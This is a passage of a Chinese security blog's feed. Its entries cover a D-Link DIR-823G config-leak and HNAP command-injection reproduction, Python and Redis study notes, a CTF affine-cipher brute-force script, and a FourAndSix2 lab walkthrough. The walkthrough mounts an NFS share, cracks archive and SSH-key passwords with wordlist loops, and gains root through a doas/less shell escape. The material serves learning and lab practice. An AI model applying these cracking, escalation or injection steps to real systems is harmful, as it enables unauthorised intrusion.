    <content type="html"><![CDATA[<h2 id="Dlink-DIR-823G漏洞复现-CVE-2019-7298-CVE-2019-7297"><a href="#Dlink-DIR-823G漏洞复现-CVE-2019-7298-CVE-2019-7297" class="headerlink" title="Dlink DIR-823G漏洞复现(CVE-2019-7298, CVE-2019-7297)"></a>Dlink DIR-823G漏洞复现(CVE-2019-7298, CVE-2019-7297)</h2><p>binwale提取文件</p><p>文件下载<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823GA1_FW102B03.bin" target="_blank" rel="noopener">地址</a></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823.png" alt=""></p><p>之后进行固件的模拟，</p><p>成功ping通网络<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ping0.png" alt=""></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-4.png" alt=""></p><p>第一次进入路由器需要需要进行一些设置页面，查看是否有未授权访问的情况</p><p> 导出配置文件（信息泄露）。</p><p><img src="https://i.imgur.com/2ElxWaU.png" alt="DIR823-0"></p><!-- ![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-0.png) --><p>浏览器访问直接弹出了下载页面</p><p><img src="https://i.imgur.com/7Y9pWFQ.png" alt="DIR823-1"></p><p>导出配置文件，<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-2.png" alt=""></p><p>获取到系统信息</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-3.png" alt=""></p><h2 id="goahead程序分析-命令注入"><a href="#goahead程序分析-命令注入" class="headerlink" title="goahead程序分析(命令注入)"></a>goahead程序分析(命令注入)</h2><p>在查看固件的bin目录时发现了一个goahead的程序，说明此路由器是通过goahead进行开发的</p><p>拖入到IDA中进行分析，发现0x42424C处注册了处理函数</p><p>抓取到登陆的数据包，是发往/HNAP1/的</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-5.png" alt=""></p><p>分析<code>/HNAP1</code> 处理函数的逻辑。 函数位于<code>0x42383C</code></p><p>在这个部分，从函数表中进行遍历，寻找函数</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-6.png" alt=""></p><p>函数表如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-7.png" alt=""></p><p>找到了需要调用的处理函数后，会首先记录 POST 的原始报文, 首先用 snprintf 生成命令， 然后使用 system 执行。</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-8.png" alt=""></p><p>我们可以通过直接注入 <code>&#39;</code> 来命令执行</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-9.png" alt=""></p><p>验证一下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-10.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank" rel="noopener">DIR-823G HNAP_Entry_Func</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Dlink-DIR-823G漏洞复现-CVE-2019-7298-CVE-2019-7297&quot;&gt;&lt;a href=&quot;#Dlink-DIR-823G漏洞复现-CVE-2019-7298-CVE-2019-7297&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="CVE" scheme="https://prontosil.club/tags/CVE/"/>
    
      <category term="goahead" scheme="https://prontosil.club/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>python文档阅读笔记3</title>
    <link href="https://prontosil.club/2019/07/31/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03/"/>
    <id>https://prontosil.club/2019/07/31/python文档阅读笔记3/</id>
    <published>2019-07-31T14:16:03.000Z</published>
    <updated>2019-08-01T01:18:42.222Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python文件操作"><a href="#python文件操作" class="headerlink" title="python文件操作"></a>python文件操作</h2><p>读文件，使用<code>open</code>函数打开一个文件<br>如果不指定模式，则默认以 text mode 打开</p><blockquote><p>这意味着从文件中读取或写入字符串时，都会以指定的编码方式进行编码。如果未指定编码格式，默认值与平台相关</p></blockquote><p><code>read()</code>方法，可选参数<code>size</code>，当 size 被省略或者为负的时候，将读取并返回文件的整个内容</p><p><code>readline()</code>方法，从文件中读取一行</p><p>如果要遍历文件，可以采取遍历文件对象的方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line"><span class="meta">... </span>    print(line, end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>这种实现方式比较高效</p><p>在编写脚本的过程中，注意文件的打开方式，编码这些小细节</p><p>写文件</p><blockquote><p>f.write(string) 会把 string 的内容写入到文件中，并返回写入的字符数。</p><p>f.tell() 返回一个整数，给出文件对象在文件中的当前位置，表示为二进制模式下时从文件开始的字节数，以及文本模式下的不透明数字。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python文件操作&quot;&gt;&lt;a href=&quot;#python文件操作&quot; class=&quot;headerlink&quot; title=&quot;python文件操作&quot;&gt;&lt;/a&gt;python文件操作&lt;/h2&gt;&lt;p&gt;读文件，使用&lt;code&gt;open&lt;/code&gt;函数打开一个文件&lt;br&gt;如果不
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>cybrics复现</title>
    <link href="https://prontosil.club/2019/07/31/cybrics%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/07/31/cybrics复现/</id>
    <published>2019-07-31T12:52:25.000Z</published>
    <updated>2019-07-31T12:53:44.973Z</updated>
    
    <content type="html"><![CDATA[<p>目前太菜了，没做出几道cybrics的题目，趁着题目还在复现一波</p><h2 id="Zakukozh"><a href="#Zakukozh" class="headerlink" title="Zakukozh"></a>Zakukozh</h2><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cybrics0.png" alt=""><br><a href="https://dystopia.sg/files/zakukozh.bin" target="_blank" rel="noopener">下载地址</a></p><p>下载了一个文件，于是想查看文件类型：</p><p><code>zakukozh.bin: data</code></p><p>题目中有提示说是<code>affine cipher</code></p><p><code>affine cipher</code>中文翻译过来就是放射密码，可以理解成简单的替换加密，比如wikipedia上举出的<a href="https://en.wikipedia.org/wiki/Affine_cipher#Examples" target="_blank" rel="noopener">栗子</a></p><blockquote><p>一个大小为m的字母表，通过变换 $E(x) = (ax+b) mod \, m$ 得到密文</p></blockquote><p>查看文件的十六进制形式，学习一些<code>hexdump</code>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pxy@LAPTOP-UBIEP4K5  /mnt/f/1.ctf/cybrics/crypto  hexdump -C zakukozh.bin| head</span><br><span class="line">00000000  60 09 eb 82 1c ef df ef  59 59 59 1c a0 91 55 27  |`.......YYY...U&apos;|</span><br><span class="line">00000010  59 59 77 bc 59 59 59 2e  d1 77 59 59 59 a9 44 38  |YYw.YYY..wYYY.D8|</span><br><span class="line">00000020  31 59 59 59 68 16 27 82  37 59 8b 6b fd 00 59 59  |1YYYh.&apos;.7Y.k..YY|</span><br><span class="line">00000030  59 95 62 28 dc 28 59 59  b8 ba fe 1d 08 a4 59 59  |Y.b(.(YY......YY|</span><br><span class="line">00000040  59 e0 e9 91 90 16 59 59  2b c6 59 59 2b c6 68 02  |Y.....YY+.YY+.h.|</span><br><span class="line">00000050  da 31 35 59 59 fe 7e a0  55 28 45 61 db 3c 3d 10  |.15YY.~.U(Ea.&lt;=.|</span><br><span class="line">00000060  08 a6 a1 a3 a4 89 ab 3e  68 b0 1b 82 a6 35 fd cd  |.......&gt;h....5..|</span><br><span class="line">00000070  1c e0 d9 de 59 67 7f e3  45 70 b0 e2 e6 22 55 17  |....Yg..Ep...&quot;U.|</span><br><span class="line">00000080  32 d9 de 3e 87 1d d2 c2  59 51 e7 e6 59 49 a2 82  |2..&gt;....YQ..YI..|</span><br><span class="line">00000090  68 39 eb ab 77 19 7d fd  a4 d9 a1 b0 ef 59 f8 07  |h9..w.&#125;......Y..|</span><br></pre></td></tr></table></figure><p>查看十六进制数据如上，根据题目的提示，这就是仿射加密之后的结果，那么如何确定a,b,m这三个参数</p><p>由于是二进制数据，那么m就是256<br>a和b就通过爆破来解决</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reffine</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr((a * (ord(c) - b)) % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'zakukozh.bin'</span>) <span class="keyword">as</span> f:</span><br><span class="line">encrypted = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        decrypted = <span class="string">''</span>.join([reffine(i, j, c) <span class="keyword">for</span> c <span class="keyword">in</span> encrypted])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'output/dec_&#123;&#125;_&#123;&#125;.out'</span>.format(i, j), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br></pre></td></tr></table></figure><p>就是跑的太慢了 :joy:</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目前太菜了，没做出几道cybrics的题目，趁着题目还在复现一波&lt;/p&gt;
&lt;h2 id=&quot;Zakukozh&quot;&gt;&lt;a href=&quot;#Zakukozh&quot; class=&quot;headerlink&quot; title=&quot;Zakukozh&quot;&gt;&lt;/a&gt;Zakukozh&lt;/h2&gt;&lt;p&gt;&lt;img s
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="cybrics" scheme="https://prontosil.club/tags/cybrics/"/>
    
  </entry>
  
  <entry>
    <title>redis源码阅读——dict</title>
    <link href="https://prontosil.club/2019/07/30/redis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict/"/>
    <id>https://prontosil.club/2019/07/30/redis源码阅读——dict/</id>
    <published>2019-07-30T15:31:53.000Z</published>
    <updated>2019-07-30T16:02:23.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dict类型"><a href="#dict类型" class="headerlink" title="dict类型"></a>dict类型</h2><p>先看宏定义</p><p>最基本的是dict类型，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dict &#123;</span><br><span class="line">    dictType *type;</span><br><span class="line">    void *privdata;</span><br><span class="line">    dictht ht[2];</span><br><span class="line">    PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */</span><br><span class="line">    int iterators; /* number of iterators currently running */</span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure><ul><li>dictType 是一个结构体，包含了dict的一些基础方法</li><li>privdata 是私有数据</li><li>dictht 是哈希表</li><li>rehashidx 代表是否在进行重哈希，如果不为-1则代表正在进行重哈希</li><li>iterators 代表迭代器，暂时还不太理解</li></ul><p>接下来看哈希表的结构(dictht):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dictht &#123;</span><br><span class="line">    dictEntry **table;</span><br><span class="line">    PORT_ULONG size;</span><br><span class="line">    PORT_ULONG sizemask;</span><br><span class="line">    PORT_ULONG used;</span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure><ul><li>table是一个指向<code>dictEntry</code>的二级指针</li><li>size代表哈希表的大小</li><li>sizemask 总是等于size-1</li><li>used代表该哈希表已有的节点数量</li></ul><p>这是<code>dictht</code>的构造：<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/graphviz-bd3eecd927a4d8fc33b4a1c7f5957c52d67c5021.png" alt=""></p><p>不过这里为什么要二级指针呢？</p><blockquote><p>可以这样理解，因为<code>dictEntry *</code>本身就是一个一级指针，同时<code>table</code>指向的又是一个指针数组，所以这里需要二级指针了</p></blockquote><h3 id="复习一下数组指针和指针数组的概念"><a href="#复习一下数组指针和指针数组的概念" class="headerlink" title="复习一下数组指针和指针数组的概念"></a>复习一下数组指针和指针数组的概念</h3><p>数组指针，本质上还是指针</p><p><code>int (*p)[n]</code><br><code>()</code>运算优先级更高，<code>*</code>优先与p结合，p还是一个指针，不过p指向的是一个数组，这时候<code>p+1</code>运算的步长就是<code>n</code>,故这样的指针也叫行指针</p><p>指针数组<br><code>int *p[n]</code><br><code>[]</code>优先级更高，p先与方括号结合，这时候p代表的是一个数组，这个数组中每个元素都是一个指针，故此时p就是二级指针</p><p>之后继续看<code>dictEntry</code>类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dictEntry &#123;</span><br><span class="line">    void *key;</span><br><span class="line">    union &#123;</span><br><span class="line">        void *val;</span><br><span class="line">        uint64_t u64;</span><br><span class="line">        int64_t s64;</span><br><span class="line">        double d;</span><br><span class="line">    &#125; v;</span><br><span class="line">    struct dictEntry *next;</span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure><p>这里面存储了key-value键值对，其中<code>key</code>是一个<code>void*</code>类型的指针，可以代表任意类型的数据，但是<code>value</code>是一个联合体，可以在指针，整数和浮点数中取值</p><p><code>next</code>属性是指向另一个哈希表节点的指针， 这个指针可以将多个哈希值相同的键值对连接在一次， 以此来解决键冲突（collision）的问题</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dictentry.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://redisbook.com/preview/dict/datastruct.html" target="_blank" rel="noopener">字典的实现</a><br><a href="http://zhangtielei.com/posts/blog-redis-dict.html" target="_blank" rel="noopener">Redis内部数据结构详解(1)——dict</a><br><a href="https://www.cnblogs.com/hongcha717/archive/2010/10/24/1859780.html" target="_blank" rel="noopener">数组指针和指针数组的区别</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;dict类型&quot;&gt;&lt;a href=&quot;#dict类型&quot; class=&quot;headerlink&quot; title=&quot;dict类型&quot;&gt;&lt;/a&gt;dict类型&lt;/h2&gt;&lt;p&gt;先看宏定义&lt;/p&gt;
&lt;p&gt;最基本的是dict类型，如下：&lt;/p&gt;
&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="redis" scheme="https://prontosil.club/tags/redis/"/>
    
      <category term="dict" scheme="https://prontosil.club/tags/dict/"/>
    
  </entry>
  
  <entry>
    <title>redis源码阅读——sds</title>
    <link href="https://prontosil.club/2019/07/30/redis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds/"/>
    <id>https://prontosil.club/2019/07/30/redis源码阅读——sds/</id>
    <published>2019-07-30T15:27:03.000Z</published>
    <updated>2019-07-30T16:02:26.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="从redis源码开始"><a href="#从redis源码开始" class="headerlink" title="从redis源码开始"></a>从redis源码开始</h2><p>都说写代码是在表达自己，阅读代码是在理解别人，尤其是阅读高质量的源代码，于是便从头开始读起了redis的源码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;从redis源码开始&quot;&gt;&lt;a href=&quot;#从redis源码开始&quot; class=&quot;headerlink&quot; title=&quot;从redis源码开始&quot;&gt;&lt;/a&gt;从redis源码开始&lt;/h2&gt;&lt;p&gt;都说写代码是在表达自己，阅读代码是在理解别人，尤其是阅读高质量的源代码，于是
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="redis" scheme="https://prontosil.club/tags/redis/"/>
    
      <category term="sds" scheme="https://prontosil.club/tags/sds/"/>
    
  </entry>
  
  <entry>
    <title>靶机渗透</title>
    <link href="https://prontosil.club/2019/07/30/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/07/30/靶机渗透/</id>
    <published>2019-07-30T15:00:04.000Z</published>
    <updated>2019-07-30T15:01:18.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fourandsix2靶机"><a href="#fourandsix2靶机" class="headerlink" title="fourandsix2靶机"></a>fourandsix2靶机</h2><p>一开机就可以看到IP地址位192.168.41.132</p><p>然后nmap开始扫描<br><code>nmap -A -n -v -Pn -A 192.168.41.132</code><br>-A Enable OS detection, version detection, script scanning, and traceroute<br>-n -n/-R: Never do DNS resolution/Always resolve [default: sometimes]<br>-Pn  Treat all hosts as online — skip host discovery</p><p>扫描的报告：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.41.132</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)</span><br><span class="line">|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)</span><br><span class="line">|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: OpenBSD 6.X</span><br><span class="line">OS CPE: cpe:/o:openbsd:openbsd:6</span><br><span class="line">OS details: OpenBSD 6.0 - 6.1</span><br><span class="line">Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=258 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Randomized</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.59 ms 192.168.41.132</span><br></pre></td></tr></table></figure></p><p>难得一次nmap可以扫出这么多信息<br>看到靶机开放了2049号端口，是nfs服务，那么尝试扫描可以挂载的目录</p><ul><li>-sV : Probe open ports to determine service/version info</li></ul><p><code>nmap -sV --script=nfs-showmount 192.168.41.132</code><br>扫描可以挂载的目录</p><p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| nfs-showmount:</span><br><span class="line">|_  /home/user/storage</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br></pre></td></tr></table></figure></p><p>很好，那就可以挂载目录了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/</span><br><span class="line">nfspy@192.168.41.132:/home/user/storage:/&gt;</span><br></pre></td></tr></table></figure><p>nfspysh的用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -h</span><br><span class="line">Usage: nfspysh [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -l          List mount options available</span><br><span class="line">  -o OPTIONS  Mount options as in nfspy</span><br><span class="line">  -c COMMAND  Semicolon-separated commands to run (batch mode)</span><br></pre></td></tr></table></figure></p><p>目录下有一个压缩包<br><code>get backup.7z</code><br>然后尝试用7z去解压缩，但是有密码</p><p>于是用<code>john</code>去破解</p><p>然而爆破有点慢</p><p>不过密码就是<code>chocolate</code></p><p>ps.kali里面其实有很多字典的，比如<code>/usr/share/john/password.lst</code></p><p>解压缩之后得到的是一个公钥和私钥</p><p>通过下面这段脚本爆破出密码是12345678<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure></p><p>然后就可以登陆了<br><code>ssh -i id_rsa user@192.168.41.132</code></p><p>之前一直尝试没登陆成功，因为我忘记赋权了<br>也就是<br><code>chmod 600 id_rsa</code></p><p>然后就可以登陆了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">Enter passphrase for key &apos;id_rsa&apos;:</span><br><span class="line">Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114</span><br><span class="line">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018</span><br><span class="line"></span><br><span class="line">Welcome to OpenBSD: The proactively secure Unix-like operating system.</span><br><span class="line"></span><br><span class="line">Please use the sendbug(1) utility to report bugs in the system.</span><br><span class="line">Before reporting a bug, please try to reproduce it with the latest</span><br><span class="line">version of the code.  With bug reports, please try to ensure that</span><br><span class="line">enough information to reproduce the problem is enclosed, and if a</span><br><span class="line">known fix for it exists, include that as well.</span><br><span class="line"></span><br><span class="line">fourandsix2$</span><br></pre></td></tr></table></figure></p><p>如下是错误的做法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;id_rsa&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br></pre></td></tr></table></figure></p><p>登陆之后</p><p>没办法直接访问root文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2$ ls /root/</span><br><span class="line">ls: /root/: Permission denied</span><br></pre></td></tr></table></figure></p><p>接下来这波操作很不明白</p><p>输入<br><code>doas /usr/bin/less /var/log/authlog</code><br>然后按v进入编辑模式<br>之后输入<code>:!/bin/sh</code></p><p><img src="https://i.imgur.com/rU9dNJP.png" alt="four"></p><p>于是就提权了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>成功了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# cat /root/flag.txt                                                                                                                                             </span><br><span class="line">Nice you hacked all the passwords!</span><br><span class="line"></span><br><span class="line">Not all tools worked well. But with some command magic...:</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here is the flag:</span><br><span class="line">acd043bc3103ed3dd02eee99d5b0ff42</span><br></pre></td></tr></table></figure><p>补充提权的过程：<br>在<code>/etc/doas.conf</code>文件中有这些内容<br>所以可以用<code>doas</code>命令查看<code>authlod</code>文件<br>同时，通过编辑它，进入了shell</p><p><img src="https://i.imgur.com/iZC9p7A.png" alt="doas"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/web/194783.html" target="_blank" rel="noopener">FourAndSix2.01靶机渗透</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;fourandsix2靶机&quot;&gt;&lt;a href=&quot;#fourandsix2靶机&quot; class=&quot;headerlink&quot; title=&quot;fourandsix2靶机&quot;&gt;&lt;/a&gt;fourandsix2靶机&lt;/h2&gt;&lt;p&gt;一开机就可以看到IP地址位192.168.41.13
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="靶机" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="nfs" scheme="https://prontosil.club/tags/nfs/"/>
    
